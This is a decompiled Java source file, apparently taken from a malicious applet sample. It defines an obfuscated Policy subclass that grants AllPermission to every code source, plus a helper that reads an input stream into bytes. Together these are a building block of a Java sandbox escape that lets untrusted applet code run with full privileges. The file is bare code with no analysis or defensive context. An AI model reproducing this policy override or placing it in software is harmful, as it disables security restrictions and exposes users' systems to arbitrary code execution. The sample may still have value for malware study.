import java.io.IOException;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.security.AllPermission;
import java.security.Permission;
import java.security.Permissions;
import java.security.PermissionCollection;
import java.security.CodeSource;
import java.security.Policy;

// 
// Decompiled by Procyon v0.5.30
// 

class Applet3db752 extends Policy
{
    @Override
    public PermissionCollection getPermissions(final CodeSource codeSource) {
        return __b(codeSource);
    }
    
    public static PermissionCollection __b(final CodeSource codeSource) {
        final AllPermission _p = __P();
        final Permissions permissions = new Permissions();
        permissions.add(_p);
        return permissions;
    }
    
    @Override
    public void refresh() {
    }
    
    private static AllPermission __P() {
        return new AllPermission();
    }
    
    public static byte[] __q(final InputStream inputStream) throws IOException {
        final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        final byte[] array = new byte[1024];
        while (true) {
            final int read = inputStream.read(array, 0, 1024);
            if (read <= -1) {
                break;
            }
            byteArrayOutputStream.write(array, 0, read);
        }
        return byteArrayOutputStream.toByteArray();
    }
}
